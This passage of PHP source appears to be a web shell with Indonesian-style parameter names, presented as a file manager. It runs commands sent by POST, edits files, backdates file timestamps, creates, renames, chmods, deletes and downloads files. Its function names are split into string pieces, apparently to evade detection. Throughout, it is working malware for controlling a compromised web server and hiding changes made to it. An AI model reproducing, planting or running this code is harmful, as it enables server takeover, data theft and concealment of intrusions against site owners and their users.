        if ($fgt($_POST['loknya']) == $_POST['src']) echo '<div class="alert alert-ok">File saved.</div>';
        else echo '<div class="alert alert-err">Save failed.</div>';
    }
    echo '<div class="p3-panel"><div class="p3-panel-head"><i class="fa fa-edit"></i> &nbsp;'.htmlspecialchars($_POST['loknya']).'</div><div class="p3-panel-body">';
    echo '<form method="post">
        <textarea class="src-edit" name="src">'.htmlspecialchars($fgt($_POST['loknya'])).'</textarea>
        <div class="form-row" style="margin-top:10px">
            <input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
            <input type="hidden" name="pilih" value="edit">
            <button type="submit" name="gasedit" class="btn">Save File</button>
        </div>
    </form></div></div>';

} elseif (isset($_POST['komends'])) {
    if (isset($_POST['komend'])) {
        if (isset($_GET['loknya'])) { $lk = $_GET['loknya']; } else { $lk = $gcw(); }
        $km = 'ko'.'me'.'nd';
        echo $km($_POST['komend'], $lk);
        exit();
    }

} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
    if (isset($_POST['tanggale'])) {
        $stt = "st"."rtot"."ime"; $tch = "t"."ou"."ch";
        $tanggale = $stt($_POST['tanggal']);
        if (@$tch($_POST['loknya'], $tanggale) === true) {
            echo '<div class="alert alert-ok">Timestamp changed.</div>';
            $det = "da"."te"; $ftm = "fi"."le"."mti"."me";
            $b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
            echo '<form method="post" class="form-row">
                <label class="form-label" style="margin:0">New Date:</label>
                <input type="text" name="tanggal" size="24" value="'.$b.'">
                <input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="ubahtanggal">
                <input type="hidden" name="type" value="'.$_POST['ty'.'pe'].'">
                <button type="submit" name="tanggale" class="btn">Apply</button>
            </form>';
        } else { echo '<div class="alert alert-err">Failed to change timestamp.</div>'; }
    } else {
        $det = "da"."te"; $ftm = "fi"."le"."mti"."me";
        $b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
        echo '<form method="post" class="form-row">
            <label class="form-label" style="margin:0">New Date:</label>
            <input type="text" name="tanggal" size="24" value="'.$b.'">
            <input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
            <input type="hidden" name="pilih" value="ubahtanggal">
            <input type="hidden" name="type" value="'.$_POST['ty'.'pe'].'">
            <button type="submit" name="tanggale" class="btn">Apply</button>
        </form>';
    }

} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
    $dunlute = $_POST['loknya'];
    if ($fxt($dunlute) && isset($dunlute)) {
        if ($ird($dunlute)) { dunlut($dunlute); }
        elseif ($idr($fl)) { echo '<div class="alert alert-err">That is a directory, not a file.</div>'; }
        else { echo '<div class="alert alert-err">File is not readable.</div>'; }
    } else { echo '<div class="alert alert-err">File not found.</div>'; }

} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['loknya'];
        if (isset($_POST['buatfolder'])) {
            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf) echo '<div class="alert alert-ok">Folder <strong>'.htmlspecialchars($_POST['fo'.'lde'.'rba'.'ru']).'</strong> created.</div>';
            else echo '<div class="alert alert-err">Failed to create folder.</div>';
        }
        echo '<form method="post" class="form-row">
            <label class="form-label" style="margin:0">Folder Name:</label>
            <input type="text" name="fo'.'lde'.'rba'.'ru" style="width:200px">
            <input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
            <input type="hidden" name="pilih" value="folder">
            <button type="submit" name="buatfolder" class="btn">Create Folder</button>
        </form>';
    }

} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['lok'.'nya'];
        if (isset($_POST['buatfi'.'le'])) {
            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) echo '<div class="alert alert-ok">File <strong>'.htmlspecialchars($_POST['fi'.'lebaru']).'</strong> created.</div>';
            else echo '<div class="alert alert-err">Failed to create file.</div>';
        }
        echo '<form method="post" class="form-row">
            <label class="form-label" style="margin:0">Filename:</label>
            <input type="text" name="fi'.'lebaru" style="width:200px">
            <input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
            <input type="hidden" name="pilih" value="fi'.'le">
            <button type="submit" name="buatfi'.'le" class="btn">Create File</button>
        </form>';
    }
}
?>

<!-- FILE TABLE -->
<div class="p3-panel">
<div class="p3-panel-head"><i class="fa fa-folder-open"></i> &nbsp;Directory Listing</div>
<div style="overflow-x:auto">
<table id="file-table">
<thead>
<tr>
    <th>Name</th>
    <th style="text-align:right">Size</th>
    <th>Modified</th>
    <th>Owner / Group</th>
    <th>Perms</th>
    <th>Actions</th>
</tr>
</thead>
<tbody>

<?php

$euybrekw = $srl($bsn($lokasi), "", $lokasi);
$euybrekw = $srl("//", "/", $euybrekw);
echo '<tr>
<td class="name-cell"><i class="fa fa-folder dir-icon"></i><a href="?loknya='.$euybrekw.'">..</a></td>
<td class="size-cell">—</td>
<td class="date-cell">'.fdt($euybrekw).'</td>
<td class="owner-cell">'.gor($euybrekw).' / '.ggr($euybrekw).'</td>
<td class="perm-cell">'.renderPerm($euybrekw).'</td>
<td class="actions-cell">
<form method="POST" action="?pilihan&loknya='.$lokasi.'">
<input type="hidden" name="type" value="dir">
<input type="hidden" name="loknya" value="'.$lokasi.'">
<button type="submit" class="btn-icon" name="pilih" value="folder" title="New Folder"><i class="fa fa-folder-o"></i></button>
<button type="submit" class="btn-icon" name="pilih" value="file" title="New File"><i class="fa fa-file-o"></i></button>
</form>
</td>
</tr>';


foreach($lokasinya as $ppkcina){
    $euybre = $srl("//","/",$lokasi."/".$ppkcina);
    if(!$idi($euybre) || $ppkcina=='.' || $ppkcina=='..') continue;
    echo '<tr>
    <td class="name-cell"><i class="fa fa-folder dir-icon"></i><a href="?loknya='.$euybre.'">'.$ppkcina.'</a></td>
    <td class="size-cell">—</td>
    <td class="date-cell">'.fdt($euybre).'</td>
    <td class="owner-cell">'.gor($euybre).' / '.ggr($euybre).'</td>
    <td class="perm-cell">'.renderPerm($euybre).'</td>
    <td class="actions-cell"><form method="POST" action="?pilihan&loknya='.$lokasi.'">
    <input type="hidden" name="type" value="dir">
    <input type="hidden" name="loknya" value="'.$euybre.'">
    <button type="submit" class="btn-icon" name="pilih" value="ubahnama" title="Rename"><i class="fa fa-pencil"></i></button>
    <button type="submit" class="btn-icon" name="pilih" value="ubahtanggal" title="Touch"><i class="fa fa-calendar"></i></button>
    <button type="submit" class="btn-icon" name="pilih" value="ubahmod" title="Chmod"><i class="fa fa-gear"></i></button>
    <button type="submit" class="btn-icon danger" name="pilih" value="hapus" title="Delete"><i class="fa fa-trash"></i></button>
    </form></td></tr>';
}


echo '<tr class="table-sep"><td colspan="6"><i class="fa fa-file-o" style="margin-right:6px"></i> Files</td></tr>';


$skd = "10"."24";
foreach($lokasinya as $mekicina){
    $euybray = $srl("//","/",$lokasi."/".$mekicina);
    if(!$ifi("$lokasi/$mekicina")) continue;
    $size = $fsz("$lokasi/$mekicina")/$skd;
    $size = $rd($size,3);
    if($size >= $skd){ $size = $rd($size/$skd,2).' MB'; } else { $size = $size.' KB'; }
    echo '<tr>
    <td class="name-cell">'.cfn($euybray).'<a href="?lokasie='.$lokasi.'/'.$mekicina.'&loknya='.$lokasi.'">'.$mekicina.'</a></td>
    <td class="size-cell">'.$size.'</td>
    <td class="date-cell">'.fdt($euybray).'</td>
    <td class="owner-cell">'.gor($euybray).' / '.ggr($euybray).'</td>
    <td class="perm-cell">'.renderPerm($euybray).'</td>
    <td class="actions-cell"><form method="post" action="?pilihan&loknya='.$lokasi.'">
    <button type="submit" class="btn-icon" name="pilih" value="edit" title="Edit"><i class="fa fa-edit"></i></button>
    <button type="submit" class="btn-icon" name="pilih" value="ubahnama" title="Rename"><i class="fa fa-pencil"></i></button>
    <button type="submit" class="btn-icon" name="pilih" value="ubahtanggal" title="Touch"><i class="fa fa-calendar"></i></button>
    <button type="submit" class="btn-icon" name="pilih" value="ubahmod" title="Chmod"><i class="fa fa-gear"></i></button>
    <button type="submit" class="btn-icon dl" name="pilih" value="dunlut" title="Download"><i class="fa fa-download"></i></button>
    <button type="submit" class="btn-icon danger" name="pilih" value="hapus" title="Delete"><i class="fa fa-trash"></i></button>
    <input type="hidden" name="type" value="file">
    <input type="hidden" name="loknya" value="'.$lokasi.'/'.$mekicina.'">
    </form></td></tr>';
}
?>
</tbody>
</table>
</div><!-- overflow-x -->
</div><!-- p3-panel -->

<?php author(); ?>
</div><!-- shell-wrap -->
</body>
</html>